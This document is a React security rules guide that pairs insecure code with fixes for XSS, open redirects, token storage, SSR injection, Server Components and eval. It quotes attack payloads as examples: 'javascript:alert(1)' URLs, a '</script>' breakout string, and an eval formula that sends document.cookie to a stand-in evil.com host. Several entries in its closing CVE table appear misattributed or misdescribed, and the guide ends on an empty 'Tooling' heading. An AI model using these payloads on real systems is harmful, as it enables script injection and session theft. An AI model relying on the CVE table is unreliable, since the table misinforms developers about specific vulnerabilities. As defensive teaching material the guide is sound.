# ⚛️ React Security Rules

> **Standard:** Security rules for React 18+ and React 19 applications including SPAs, SSR, and Server Components.
> **Sources:** React Security Documentation, OWASP Top 10:2025, CWE/MITRE, NVD/CVE Database, GitHub Advisory Database, Snyk React Security Advisories, Google Project Zero, OWASP Cheat Sheet Series
> **Version:** 1.0.0
> **Last updated:** March 2026
> **Scope:** React 18+ and React 19 (including Server Components and Server Actions), common state management libraries (Redux Toolkit, Zustand, Recoil, Jotai), routing (react-router v6/v7), data fetching (React Query, SWR, Axios), and build tooling (Vite, CRA, Webpack). Next.js-specific security is covered in `code-security-nextjs.md`.

---

## General Instructions

Apply these rules when writing or reviewing React code. React's declarative model auto-escapes JSX output by default — but this protection disappears the moment you use `dangerouslySetInnerHTML`, construct URLs from user input, or spread untrusted objects as props. React's distinct risk profile includes: **`dangerouslySetInnerHTML` is a direct XSS sink**; **`href`, `src`, and `action` props accept `javascript:` and `data:` URIs** that execute scripts when clicked; **`REACT_APP_*` and `VITE_*` environment variables are embedded in the client bundle** and visible to all users; **spreading untrusted objects as props (`{...userObj}`) enables prototype pollution and prop injection**; and **storing JWTs or sensitive tokens in `localStorage`/`sessionStorage` exposes them to XSS**. State management libraries (Redux, Zustand) make it easy to store sensitive data that ends up serialized in logs or Redux DevTools.

---

## 1. XSS via `dangerouslySetInnerHTML`

**Vulnerability:** `dangerouslySetInnerHTML={{ __html: userInput }}` bypasses React's auto-escaping and renders raw HTML, enabling XSS. Unlike the Go `html/template` vs `text/template` distinction, React's JSX auto-escaping is **not applied** when you use this API — any script tags, event handlers, or `javascript:` URIs in the string execute in the user's browser.

**References:** CWE-79, CWE-116

### Mandatory Rules

- **Never pass unvalidated user input to `dangerouslySetInnerHTML`** — this is a direct XSS sink; assume all user-supplied HTML is malicious.
- **Sanitize HTML with DOMPurify before rendering** — `DOMPurify.sanitize(html)` uses an allowlist of safe tags and attributes; configure `ALLOWED_TAGS` and `ALLOWED_ATTR` to the minimum required.
- **Prefer markdown-to-HTML renderers** (react-markdown, marked with `sanitize: true`) over raw HTML rendering for user-generated content — they restrict the output to safe markup.
- **Never use `dangerouslySetInnerHTML` in combination with `eval()`** or template strings that construct the HTML from state — chain vulnerabilities compound.
- **Add a strict Content Security Policy** that blocks inline scripts (`script-src 'self'`) as defense in depth — even if XSS is injected, a strict CSP prevents script execution.

```jsx
// ❌ INSECURE — raw user HTML executed as DOM
function Comment({ body }) {
  return <div dangerouslySetInnerHTML={{ __html: body }} />;
}

// ❌ INSECURE — sanitizing with regex is bypassable (e.g., nested tags, encodings)
const cleaned = body.replace(/<script>/gi, '');
<div dangerouslySetInnerHTML={{ __html: cleaned }} />;

// ✅ SECURE — DOMPurify with restrictive allowlist
import DOMPurify from 'dompurify';

const ALLOWED = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href', 'rel', 'target'],
};

function Comment({ body }) {
  const clean = DOMPurify.sanitize(body, ALLOWED);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// ✅ SECURE — prefer react-markdown for Markdown content (no raw HTML by default)
import ReactMarkdown from 'react-markdown';

function Comment({ body }) {
  return <ReactMarkdown>{body}</ReactMarkdown>; // raw HTML disabled by default
}
```

---

## 2. URL Injection — `javascript:` and `data:` Protocol XSS

**Vulnerability:** React does **not** validate the scheme of URLs passed to `href`, `src`, `action`, `formAction`, `poster`, or custom URL props. A user-supplied URL of `javascript:alert(1)` executes JavaScript when the anchor is clicked. React 16.9+ added a warning for `javascript:` in `href`, but it does **not** block execution. `data:text/html,...` URIs embedded in `src` also execute scripts in some browsers.

**References:** CWE-79, CWE-601, CVE-2018-6341

### Mandatory Rules

- **Validate URL schemes before rendering in `href`, `src`, or `to` props** — only allow `https://`, `http://`, `/` (relative), and explicitly needed schemes; reject everything else.
- **Never pass `router.query`, `searchParams`, or any URL parameter directly to `href`** without scheme validation.
- **Create a `safeUrl()` helper** that returns `'#'` or throws when the scheme is not in an allowlist — use it wherever user-controlled URLs are rendered.
- **For internal routing, use `<Link to={relativePath}>` with relative paths only** — never construct absolute URLs for internal links from user input.
- **Add `rel="noopener noreferrer"` to all `target="_blank"` links** to prevent the opened page from accessing `window.opener` and performing tab-napping.

```jsx
// ❌ INSECURE — href accepts javascript:alert(1)
function UserProfile({ profileUrl }) {
  return <a href={profileUrl}>Visit Profile</a>;
}

// ❌ INSECURE — URL from query param rendered directly
function RedirectButton() {
  const { returnUrl } = useSearchParams();
  return <a href={returnUrl}>Go back</a>;
}

// ✅ SECURE — allowlist scheme validation
const SAFE_SCHEMES = ['https:', 'http:', ''];

function safeUrl(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    if (!SAFE_SCHEMES.includes(parsed.protocol)) return '#';
    return url;
  } catch {
    // Relative URLs (no scheme) are safe
    return url.startsWith('/') ? url : '#';
  }
}

function UserProfile({ profileUrl }) {
  return (
    <a href={safeUrl(profileUrl)} rel="noopener noreferrer" target="_blank">
      Visit Profile
    </a>
  );
}
```

---

## 3. Prototype Pollution via Object Spread and Prop Injection

**Vulnerability:** Spreading untrusted objects as component props (`<Component {...userObject} />`) or merging them into state (`{ ...state, ...userPayload }`) allows an attacker to inject arbitrary props, including `__proto__`, `constructor`, and `toString`. Injected props can override event handlers (`onClick`, `onChange`), bypass conditional rendering (`hidden`, `disabled`), or pollute the Object prototype affecting all objects in the application.

**References:** CWE-1321, CVE-2020-28472 (babel runtime), CVE-2021-43138 (async)

### Mandatory Rules

- **Never spread user-controlled objects as props** (`<Component {...userObj} />`) — explicitly pass only the properties you intend.
- **Sanitize objects before merging into state** — strip `__proto__`, `constructor`, and `prototype` keys from any user-supplied payload before calling `setState` or dispatching to a reducer.
- **Use `Object.create(null)` or validated DTOs** when constructing objects from user data — plain objects inherit `Object.prototype` and can be polluted.
- **Validate API response shapes with Zod/Yup before using in state** — unknown fields in an API response spread into state can override security-critical flags (e.g., `isAdmin`, `isVerified`).

```jsx
// ❌ INSECURE — spreads all user-supplied properties as props
function UserCard({ user }) {
  return <ProfileComponent {...user} />;
  // Attacker payload: { name: 'Alice', onClick: 'malicious', disabled: false }
}

// ❌ INSECURE — merges untrusted API payload into state
const newState = { ...currentState, ...apiResponse };

// ✅ SECURE — extract only known properties
function UserCard({ user }) {
  return (
    <ProfileComponent
      name={user.name}
      email={user.email}
      avatarUrl={safeUrl(user.avatarUrl)}
    />
  );
}

// ✅ SECURE — validate API response shape with Zod before merging
import { z } from 'zod';

const UserSchema = z.object({
  name: z.string().max(100),
  email: z.string().email(),
  role: z.enum(['user', 'admin']),
});

const parsed = UserSchema.parse(apiResponse); // throws on unknown/invalid fields
dispatch(setUser(parsed));
```

---

## 4. Sensitive Data in State, Redux DevTools, and Logs

**Vulnerability:** React state, Redux store, and Zustand stores are fully inspectable via browser DevTools and Redux DevTools Extension. Any sensitive data stored in state (passwords, tokens, PII, credit card numbers) is visible to anyone with browser access. Serialized state sent to error tracking services (Sentry, Datadog) via `redux-logger` or crash reporters exposes secrets.

**References:** CWE-312, CWE-532

### Mandatory Rules

- **Never store plaintext passwords, private keys, or raw payment data in React state** — pass them directly to API calls and discard immediately.
- **Store authentication tokens in `httpOnly` cookies** rather than Redux/Zustand/`localStorage` — `httpOnly` cookies are inaccessible to JavaScript.
- **Redact sensitive fields before dispatching to the Redux store** — use a middleware that strips or masks fields matching patterns like `password`, `token`, `ssn`, `cvv`.
- **Configure Redux DevTools to be disabled in production** — `process.env.NODE_ENV !== 'production'` guard prevents state inspection in deployed apps.
- **Scrub sensitive fields from error tracking payloads** — configure Sentry's `beforeSend` hook to remove `password`, `token`, and PII from breadcrumbs and event data.

```jsx
// ❌ INSECURE — password stored in Redux state; visible in DevTools
dispatch(setLoginData({ username, password, token }));

// ❌ INSECURE — Redux DevTools enabled in production
const store = configureStore({
  devTools: true, // DevTools active in production
});

// ✅ SECURE — token in httpOnly cookie (set by server); never in state
// The token is sent automatically via cookie header on every request.
// Only store non-sensitive user metadata in Redux.
dispatch(setUser({ id, name, role })); // no token, no PII

// ✅ SECURE — DevTools disabled in production
const store = configureStore({
  devTools: process.env.NODE_ENV !== 'production',
  middleware: (getDefaultMiddleware) =>
    getDefaultMiddleware().concat(sensitiveFieldRedactorMiddleware),
});

// ✅ SECURE — Sentry beforeSend scrubs sensitive data
Sentry.init({
  beforeSend(event) {
    if (event.request?.data) {
      delete event.request.data.password;
      delete event.request.data.token;
    }
    return event;
  },
});
```

---

## 5. Environment Variable Leaks (`REACT_APP_*`, `VITE_*`)

**Vulnerability:** Any environment variable prefixed with `REACT_APP_` (Create React App) or `VITE_` (Vite) is **bundled into the client-side JavaScript** and visible to every user via browser DevTools or by downloading the bundle. Secrets stored in these variables (API keys, service account credentials, database URLs) are fully exposed to anyone who opens the network tab.

**References:** CWE-312, CWE-798

### Mandatory Rules

- **Never store secrets in `REACT_APP_*` or `VITE_*` environment variables** — treat all values with these prefixes as public; they will appear in the compiled bundle.
- **Move secret usage to a backend API** — the React frontend calls your API, and the API uses the secret internally; the frontend never sees the key.
- **Audit `.env` files** to ensure no private keys, service account credentials, or internal URLs are included under the `REACT_APP_`/`VITE_` namespace.
- **Only use public configuration values** (feature flags, analytics IDs, public API endpoints) in client-side environment variables.
- **Add `REACT_APP_*` and `VITE_*` variable names to code review checklists** — secrets should only appear in server-side `.env.local` files without the client prefix.

```bash
# ❌ INSECURE — these are bundled into the client JavaScript
REACT_APP_STRIPE_SECRET_KEY=sk_live_...
REACT_APP_DATABASE_URL=postgresql://admin:password@db:5432/prod
VITE_OPENAI_API_KEY=sk-proj-...

# ✅ SECURE — only public values go in client-side env vars
REACT_APP_STRIPE_PUBLISHABLE_KEY=pk_live_...  # safe: publishable, not secret
REACT_APP_API_URL=https://api.example.com      # safe: public endpoint
VITE_ANALYTICS_ID=UA-XXXXXXXX-1               # safe: public ID

# ✅ SECURE — secrets stay server-side (no REACT_APP_/VITE_ prefix)
STRIPE_SECRET_KEY=sk_live_...   # only in backend .env; never prefixed for client
```

---

## 6. Client-Side Routing Security — Open Redirect via react-router

**Vulnerability:** Passing user-controlled values to `navigate(userUrl)`, `<Link to={userUrl}>`, or `<Redirect to={userUrl}>` can redirect users to attacker-controlled sites (open redirect). This enables phishing attacks where a trusted domain is used as a stepping stone (`https://app.example.com/redirect?to=https://evil.com`).

**References:** CWE-601, CVE-2024-45296 (path-to-regexp ReDoS in react-router v6)

### Mandatory Rules

- **Never pass URL query parameters directly to `navigate()` or `<Link to>`** without validating they are relative paths.
- **Validate that redirect targets are relative paths** (starting with `/`) or match an allowlist of trusted origins — reject absolute URLs or URLs with schemes.
- **Sanitize route parameters** used in `useParams()` before using them to construct URLs or SQL queries — route params are user-controlled.
- **Update react-router to ≥ 6.22.0** — CVE-2024-45296 was a ReDoS in `path-to-regexp` used internally by react-router v6.
- **Use typed route parameters with Zod** in React Router v7 loaders/actions to validate param shapes at the framework level.

```jsx
// ❌ INSECURE — open redirect: ?returnTo=https://evil.com/phishing
function LoginPage() {
  const [params] = useSearchParams();
  const navigate = useNavigate();

  async function handleLogin(credentials) {
    await login(credentials);
    navigate(params.get('returnTo')); // attacker controls destination
  }
}

// ✅ SECURE — only allow relative paths as redirect targets
function safeRedirect(url, fallback = '/dashboard') {
  if (!url || !url.startsWith('/') || url.startsWith('//')) {
    return fallback;
  }
  return url;
}

function LoginPage() {
  const [params] = useSearchParams();
  const navigate = useNavigate();

  async function handleLogin(credentials) {
    await login(credentials);
    navigate(safeRedirect(params.get('returnTo')));
  }
}
```

---

## 7. Authentication State — `localStorage` vs `httpOnly` Cookies

**Vulnerability:** Storing JWTs, session tokens, or OAuth access tokens in `localStorage` or `sessionStorage` exposes them to XSS. Any injected script (via a dependency, a CDN, or a single XSS vector) can call `localStorage.getItem('token')` and exfiltrate the token to an attacker-controlled server, enabling full account takeover. `httpOnly` cookies are not accessible to JavaScript.

**References:** CWE-312, CWE-922

### Mandatory Rules

- **Store authentication tokens in `httpOnly; Secure; SameSite=Strict` cookies** set by the server — these are automatically sent with requests and inaccessible to JavaScript.
- **Never store JWTs or session tokens in `localStorage`, `sessionStorage`, or React state** — all of these are accessible to JavaScript and vulnerable to XSS theft.
- **Use short-lived access tokens** (15–30 minutes) with a `httpOnly` refresh token — this limits the window of exposure even if an access token is briefly held in memory.
- **For SPAs that must hold a token in memory** (not `localStorage`), store it in a closure or React context that does not serialize to Redux or persist across page loads.
- **Clear all authentication state on logout** — call `document.cookie` invalidation API and revoke the server-side token.

```jsx
// ❌ INSECURE — JWT in localStorage; stolen by any XSS
async function login(credentials) {
  const { token } = await api.post('/auth/login', credentials);
  localStorage.setItem('authToken', token); // XSS-accessible
  axios.defaults.headers.common['Authorization'] = `Bearer ${token}`;
}

// ❌ INSECURE — token in Redux store persisted to localStorage
const persistConfig = {
  key: 'root',
  storage,
  whitelist: ['auth'], // auth slice with token is persisted
};

// ✅ SECURE — httpOnly cookie set by server; no token in JS
async function login(credentials) {
  // Server responds with Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
  await api.post('/auth/login', credentials);
  // No token handling on the client; cookie sent automatically with each request
}

// ✅ SECURE — if token must live in memory (not persisted), use React context
const AuthContext = createContext(null);
export function AuthProvider({ children }) {
  const [token, setToken] = useState(null); // in-memory only; lost on page refresh
  // ...
}
```

---

## 8. CSS Injection via Style Props

**Vulnerability:** Passing user-controlled values to the `style` prop or CSS-in-JS libraries (styled-components, Emotion) can inject CSS that hides UI elements, overlays phishing forms, exfiltrates data via CSS attribute selectors, or (in older browsers) executes script via `expression()` or `url()` with `javascript:` data URIs.

**References:** CWE-79, CWE-116

### Mandatory Rules

- **Never pass unsanitized user input as CSS property values** — even properties that seem harmless (e.g., `color`, `background`) can accept `url()` with data URIs or malicious values in some browsers.
- **Allowlist CSS property values** from user input — validate that the value matches an expected pattern (hex color, pixel dimension, named color) before using it in `style`.
- **Avoid constructing `style` objects from user-supplied keys** — `style={{ [userKey]: userValue }}` can set arbitrary CSS properties including `position: fixed`, `content: url(...)`.
- **Use CSS Modules or Tailwind class allowlists** instead of inline styles for user-influenced presentation — user input maps to a class from a predefined set, never to raw CSS.

```jsx
// ❌ INSECURE — user controls CSS property name and value
function ThemedBox({ theme }) {
  return <div style={{ [theme.property]: theme.value }}>{content}</div>;
  // payload: { property: "background", value: "url(javascript:alert(1))" }
}

// ❌ INSECURE — user color value used directly
function ColorBadge({ userColor }) {
  return <span style={{ backgroundColor: userColor }}>Label</span>;
  // payload: "red; position: fixed; top: 0; left: 0; width: 100%; height: 100%"
}

// ✅ SECURE — validate color against a strict pattern
function ColorBadge({ userColor }) {
  const HEX_COLOR = /^#[0-9A-Fa-f]{6}$/;
  const safeColor = HEX_COLOR.test(userColor) ? userColor : '#666666';
  return <span style={{ backgroundColor: safeColor }}>Label</span>;
}

// ✅ SECURE — map user preference to a predefined CSS class
const THEME_CLASSES = { red: 'badge-red', blue: 'badge-blue', green: 'badge-green' };
function ColorBadge({ userColor }) {
  const cls = THEME_CLASSES[userColor] ?? 'badge-default';
  return <span className={cls}>Label</span>;
}
```

---

## 9. SSR XSS — JSON Injection in `<script>` Tags

**Vulnerability:** Server-side rendered React apps often serialize initial state into an inline `<script>` tag for hydration (`window.__INITIAL_STATE__ = {...}`). If the serialized data contains user-controlled strings with `</script>`, `<!--`, or `<![CDATA[` sequences, the browser parser can break out of the script context and execute attacker-controlled markup.

**References:** CWE-79, CWE-116

### Mandatory Rules

- **Use `JSON.stringify()` with an HTML-escape replacer** when embedding JSON in `<script>` tags — escape `<`, `>`, `&`, and `'` inside the JSON string.
- **Never use `res.send(`<script>var data=${JSON.stringify(data)}</script>`)` without escaping** — raw JSON serialization does not escape `</script>`.
- **Use `serialize-javascript`** (npm package) instead of `JSON.stringify` for embedding state in `<script>` tags — it handles all escape sequences correctly.
- **Consider an external script or `type="application/json"` block** instead of inline scripts for initial data, then read it with `document.getElementById().textContent`.

```jsx
// ❌ INSECURE — user name = '</script><script>alert(1)</script>'
// breaks out of the script tag
const html = `
  <script>
    window.__INITIAL_STATE__ = ${JSON.stringify(state)};
  </script>`;

// ✅ SECURE — use serialize-javascript to escape special sequences
import serialize from 'serialize-javascript';

const html = `
  <script>
    window.__INITIAL_STATE__ = ${serialize(state, { isJSON: true })};
  </script>`;
// serialize-javascript escapes </script>, <!, and Unicode line separators

// ✅ SECURE ALTERNATIVE — data block instead of executable script
const html = `
  <script id="initial-state" type="application/json">
    ${serialize(state, { isJSON: true })}
  </script>`;
// Client reads: JSON.parse(document.getElementById('initial-state').textContent)
```

---

## 10. Insecure `useEffect` and Race Conditions in Security Checks

**Vulnerability:** Using `useEffect` for authorization checks or permission validation creates a render-before-check window where protected content is briefly rendered before the check completes. Async `useEffect` with stale closures can complete in the wrong order (race condition), showing protected content to unauthorized users. Relying on client-side `useEffect` for access control is fundamentally insecure — access control must be enforced server-side.

**References:** CWE-362, CWE-284

### Mandatory Rules

- **Never use `useEffect` as the primary access control mechanism** — a user can modify JavaScript to skip the effect; enforce authorization server-side via API response or protected route.
- **Guard SSR-rendered content** with server-side session validation — render 401/403 responses from the server before React hydrates, not after.
- **Abort stale `useEffect` async operations** with `AbortController` to prevent race conditions where an earlier unauthorized response overwrites a later authorized one.
- **Use route-level `loader` functions** (React Router v6/v7) that validate authorization before rendering — loaders run before the component renders, eliminating the flash of unauthorized content.

```jsx
// ❌ INSECURE — content renders before auth check; client-side only
function AdminPanel() {
  const [isAdmin, setIsAdmin] = useState(false);
  useEffect(() => {
    checkAdmin().then(setIsAdmin);
  }, []);
  // Component renders with isAdmin=false initially, then flashes to true/false
  // Attacker can set isAdmin=true in React DevTools
  if (!isAdmin) return null;
  return <SensitiveAdminContent />;
}

// ✅ SECURE — React Router v6 loader validates server-side before render
// loader runs on the server / Node; component only renders if authorized
export async function loader({ request }) {
  const session = await getSession(request.headers.get('Cookie'));
  if (!session.get('isAdmin')) {
    throw new Response('Unauthorized', { status: 403 });
  }
  return await fetchAdminData();
}

export default function AdminPanel() {
  const data = useLoaderData(); // only reached if loader didn't throw
  return <SensitiveAdminContent data={data} />;
}
```

---

## 11. Third-Party Component and Dependency Security

**Vulnerability:** React applications have large dependency trees (CRA installs ~1,500 packages). Malicious or compromised packages can inject XSS payloads, exfiltrate environment variables, or add supply-chain backdoors. `node_modules` is a common vector for event-stream-style attacks targeting React ecosystem packages.

**References:** CWE-1104, CWE-829, CVE-2022-3517 (minimatch ReDoS in react-scripts), CVE-2022-25881 (http-proxy-middleware SSRF)

### Mandatory Rules

- **Run `npm audit` or `yarn audit` in every CI pipeline** — fix or acknowledge all critical and high severity findings before merging.
- **Pin exact versions of security-sensitive packages** (`"react": "18.2.0"` not `"^18.0.0"`) — semver ranges can silently adopt compromised minor/patch releases.
- **Use Snyk, Dependabot, or Renovate** for automated dependency vulnerability scanning and PR-based updates.
- **Audit new UI component libraries before adopting** — check download counts, maintainer reputation, last release date, and open security issues on GitHub.
- **Avoid loading third-party scripts via `dangerouslySetInnerHTML`** — use `<script>` tags with `integrity` (SRI) and `crossOrigin="anonymous"` attributes.
- **Scope CSS-in-JS injection risk** by keeping styled-components/Emotion up to date — older versions had XSS vectors in server-side style serialization.
- **Migrate from Create React App (CRA)** — CRA is no longer maintained; its transitive dependencies (webpack 4, Babel, react-scripts) have accumulated unpatched CVEs. Use Vite instead.

```jsx
// ❌ INSECURE — third-party script without integrity check
<script src="https://cdn.example.com/analytics.js" />

// ✅ SECURE — Subresource Integrity (SRI) prevents tampered script execution
<script
  src="https://cdn.example.com/analytics.js"
  integrity="sha384-abc123..."
  crossOrigin="anonymous"
/>

// ✅ SECURE — package.json with exact pinning for security-critical packages
{
  "dependencies": {
    "react": "18.3.1",
    "react-dom": "18.3.1",
    "dompurify": "3.1.6"
  }
}
```

---

## 12. File Upload — Client-Side Validation Only

**Vulnerability:** Validating file types and sizes only in React (`file.type === 'image/png'`) is trivially bypassed — an attacker can rename any file or intercept the request with Burp Suite to send arbitrary content. The `file.type` property reflects the browser's MIME type guess from the extension, not actual file content.

**References:** CWE-434, CWE-20

### Mandatory Rules

- **Validate file type server-side using magic bytes** (file signature), not by extension or `Content-Type` header — use libraries like `file-type` (Node.js) on the server.
- **Enforce file size limits server-side** — client-side size checks are convenience UX, not security.
- **Rename uploaded files server-side** with a UUID — never use the original filename from `file.name`.
- **Display client-side validation feedback** (file type, size) as UX only, with an explicit comment that server-side validation is the security gate.
- **Scan uploaded files with antivirus** (ClamAV, cloud service) before making them accessible.

```jsx
// ❌ INSECURE — client-only type check; easily bypassed
function FileUpload() {
  function handleChange(e) {
    const file = e.target.files[0];
    if (file.type !== 'image/png') {
      alert('Only PNG files allowed');
      return; // attacker renames malware.exe → malware.png; bypasses this
    }
    uploadFile(file);
  }
}

// ✅ SECURE — client validation is UX only; comment makes this explicit
function FileUpload() {
  function handleChange(e) {
    const file = e.target.files[0];
    // UX-only check: server enforces actual validation via magic bytes
    if (!['image/png', 'image/jpeg'].includes(file.type)) {
      setError('Please select a PNG or JPEG image');
      return;
    }
    if (file.size > 5 * 1024 * 1024) {
      setError('File must be under 5 MB');
      return;
    }
    uploadFile(file); // server validates magic bytes, renames, scans
  }
}
```

---

## 13. Content Security Policy (CSP) Configuration

**Vulnerability:** Without a Content Security Policy, a single XSS vulnerability allows unlimited script execution, exfiltration, and UI redressing. React applications are particularly vulnerable because they often load many third-party scripts (analytics, chat widgets, A/B testing) that can themselves be compromised.

**References:** CWE-1021, CWE-79

### Mandatory Rules

- **Set a `Content-Security-Policy` header on every HTML response** — include `default-src 'self'`; explicitly list allowed script, style, font, and image origins.
- **Avoid `unsafe-inline` in `script-src`** — inline scripts are the primary XSS execution vector; use nonces (`'nonce-{random}'`) or hashes for legitimate inline scripts.
- **Use `strict-dynamic`** with nonces for dynamic script loading in CSP Level 3 — this allows React's lazy loading while blocking injected scripts.
- **Set `X-Frame-Options: DENY`** or `frame-ancestors 'none'` in CSP to prevent clickjacking.
- **Use `Trusted Types` API** as a defense-in-depth measure — it restricts DOM XSS sinks and works alongside React's auto-escaping.
- **Test your CSP** with the CSP Evaluator tool (Google) and check for bypasses before deploying.

```html
<!-- ❌ INSECURE — permissive CSP; unsafe-inline allows any inline script -->
Content-Security-Policy: default-src *; script-src * 'unsafe-inline' 'unsafe-eval'

<!-- ✅ SECURE — restrictive CSP with nonce for React's runtime -->
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM_NONCE}' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  form-action 'self';
  base-uri 'self';
```

---

## 14. React Server Components — Data Exposure and SSRF (React 19)

**Vulnerability:** React Server Components (RSC) run on the server and have access to databases, file systems, and internal services. If a Server Component passes user-controlled input to database queries, file reads, or internal HTTP calls without validation, it introduces SQL injection, path traversal, and SSRF vulnerabilities that are indistinguishable from traditional backend vulnerabilities.

**References:** CWE-89, CWE-22, CWE-918

### Mandatory Rules

- **Treat Server Components as backend code** — apply the same input validation, parameterized queries, and access control rules as for Express/Fastify route handlers.
- **Never pass raw `params` or `searchParams` to database queries** without validation — they are user-controlled strings.
- **Do not expose sensitive data from Server Components to Client Components via props** — serialized props cross the network boundary; filter to only what the client needs.
- **Apply access control in Server Components** before fetching data — verify the user's session/role before querying; do not rely on the Client Component to hide data.
- **Validate URLs passed to `fetch()` in Server Components** — an internal `fetch(userUrl)` is a server-side SSRF vulnerability.

```jsx
// ❌ INSECURE — raw search param in SQL (Server Component)
async function ProductList({ searchParams }) {
  // searchParams.category is user-controlled
  const products = await db.query(
    `SELECT * FROM products WHERE category = '${searchParams.category}'`
  );
  return <ProductGrid products={products} />;
}

// ❌ INSECURE — exposes all user fields to client, including sensitive ones
async function UserProfile({ params }) {
  const user = await db.users.findById(params.id);
  return <ClientProfile user={user} />; // passes password_hash, 2fa_secret, etc.
}

// ✅ SECURE — parameterized query; explicit field projection; auth check
async function ProductList({ searchParams }) {
  const category = z.string().max(50).parse(searchParams.category);
  const products = await db.query(
    'SELECT id, name, price FROM products WHERE category = $1',
    [category]
  );
  return <ProductGrid products={products} />;
}

async function UserProfile({ params }) {
  const session = await getServerSession();
  if (!session || session.userId !== params.id) redirect('/login');

  const user = await db.users.findById(params.id, {
    select: { id: true, name: true, avatarUrl: true }, // no sensitive fields
  });
  return <ClientProfile user={user} />;
}
```

---

## 15. `eval()`, `new Function()`, and Dynamic Code Execution in Components

**Vulnerability:** Using `eval(userInput)`, `new Function(userInput)()`, or `setTimeout(string, ...)` with user-controlled strings in React components executes arbitrary JavaScript. This is rarely intentional but can appear in code generation tools, template engines, or when processing user-defined formulas.

**References:** CWE-94, CWE-78

### Mandatory Rules

- **Never use `eval()` or `new Function()` with any data derived from user input** — including API responses, URL parameters, state values, or props.
- **Use `JSON.parse()` instead of `eval()` for parsing JSON strings** — `eval('({key: "value"})')` executes the string as code; `JSON.parse()` does not.
- **For user-defined formulas or expressions, use a safe math parser** (`mathjs`, `expr-eval`) rather than `eval()` — these libraries parse expressions without code execution.
- **Set `Content-Security-Policy: script-src 'self'` without `'unsafe-eval'`** — this blocks `eval()` at the browser level as defense in depth.

```jsx
// ❌ INSECURE — formula = "fetch('https://evil.com?c='+document.cookie)"
function Calculator({ formula }) {
  const result = eval(formula); // arbitrary code execution
  return <span>{result}</span>;
}

// ❌ INSECURE — config is an API response; could contain code
const config = eval('(' + apiResponse + ')');

// ✅ SECURE — JSON.parse for data; math parser for user formulas
import { evaluate } from 'mathjs';

function Calculator({ formula }) {
  try {
    const result = evaluate(formula); // sandboxed; no code execution
    return <span>{result}</span>;
  } catch {
    return <span>Invalid formula</span>;
  }
}

const config = JSON.parse(apiResponse); // data only; no code execution
```

---

## CVE Reference Table

| CVE | Severity | Component | Description | Fixed In |
|-----|----------|-----------|-------------|----------|
| CVE-2018-6341 | Medium (6.1) | `react-dom` ≤ 16.8.5 | `javascript:` URIs in `href` rendered without warning, enabling XSS when user clicks link | react-dom 16.9.0 (warning added; mitigated in 16.8.6) |
| CVE-2022-25881 | High (7.5) | `http-proxy-middleware` ≤ 2.0.6 (used by react-scripts) | SSRF via crafted `Host` header in development proxy | http-proxy-middleware 2.0.7 |
| CVE-2022-3517 | High (7.5) | `minimatch` ≤ 3.0.4 (transitive in react-scripts) | ReDoS via malicious glob pattern | minimatch 3.0.5 |
| CVE-2024-45296 | High (7.5) | `path-to-regexp` ≤ 0.1.10 (used by react-router v6) | ReDoS via crafted route path; backtracking regex in route matching | path-to-regexp 0.1.11, react-router 6.22.0 |
| CVE-2021-43138 | High (7.8) | `async` ≤ 2.6.3 (common React dep) | Prototype pollution via `mapValues` function | async 2.6.4, 3.2.2 |
| CVE-2020-28472 | High (7.3) | `@babel/runtime` < 7.12.5 (transitive CRA dep) | Prototype pollution in `lodash.merge`-style helpers | @babel/runtime 7.12.5 |
| CVE-2021-23369 | Critical (9.8) | `handlebars` ≤ 4.7.6 (used by some React starters) | Template injection via `lookup` helper enables RCE on server-side rendering | handlebars 4.7.7 |
| CVE-2023-26159 | Medium (6.1) | `follow-redirects` ≤ 1.15.3 (axios transitive dep) | URL redirect header spoofing leads to SSRF or information disclosure | follow-redirects 1.15.4 |
| CVE-2024-21519 | Medium (5.3) | `sanitize-html` ≤ 2.12.0 | XSS bypass via crafted HTML allowing `<script>` to pass through | sanitize-html 2.12.1 |
| CVE-2021-27358 | Medium (6.1) | `grafana-react` (Grafana's React usage) | Stored XSS via dashboard title rendered without encoding in React SSR context | Grafana 7.4.3 |

---

## Security Checklist

### XSS Prevention
- [ ] No `dangerouslySetInnerHTML` with unsanitized user input
- [ ] DOMPurify with restrictive `ALLOWED_TAGS`/`ALLOWED_ATTR` used for rich HTML
- [ ] `javascript:` and `data:` URIs blocked via `safeUrl()` helper
- [ ] All `target="_blank"` links have `rel="noopener noreferrer"`
- [ ] No `eval()` or `new Function()` with user-controlled data

### Prop and Object Safety
- [ ] User objects not spread as props (`{...userObj}`)
- [ ] API response shapes validated with Zod/Yup before merging into state
- [ ] `__proto__`, `constructor`, `prototype` keys stripped from user payloads

### Authentication and Token Storage
- [ ] Authentication tokens in `httpOnly; Secure; SameSite=Strict` cookies
- [ ] No JWTs or session tokens in `localStorage`, `sessionStorage`, or Redux state
- [ ] Redux DevTools disabled in production

### Environment Variables
- [ ] No secrets in `REACT_APP_*` or `VITE_*` variables
- [ ] `.env` files audited for accidentally exposed credentials

### Routing
- [ ] `navigate()` and `<Link to>` targets validated to be relative paths
- [ ] react-router updated to ≥ 6.22.0 (CVE-2024-45296 fix)
- [ ] Route params validated before use in queries or API calls

### State and Data
- [ ] No plaintext passwords or private keys in React state
- [ ] Sensitive fields redacted before Sentry/error tracking dispatch
- [ ] Sentry `beforeSend` scrubs `password`, `token`, PII

### File Uploads
- [ ] Server-side magic byte validation (not client-side extension check)
- [ ] Files renamed server-side with UUID
- [ ] File size limits enforced server-side

### SSR Security
- [ ] JSON state embedded in `<script>` tags uses `serialize-javascript`
- [ ] Server Components validate inputs with Zod before DB queries
- [ ] Server Components enforce access control before fetching data
- [ ] Only necessary fields passed from Server to Client Components

### Content Security Policy
- [ ] `Content-Security-Policy` header set on all HTML responses
- [ ] No `unsafe-inline` in `script-src` (use nonces)
- [ ] No `unsafe-eval` in `script-src`
- [ ] `frame-ancestors 'none'` or `X-Frame-Options: DENY` set

### Dependencies
- [ ] `npm audit` / `yarn audit` runs in CI with zero critical/high
- [ ] CRA migrated to Vite (CRA is unmaintained)
- [ ] New UI libraries audited before adoption
- [ ] Third-party CDN scripts use SRI (`integrity` attribute)

---

## Tooling

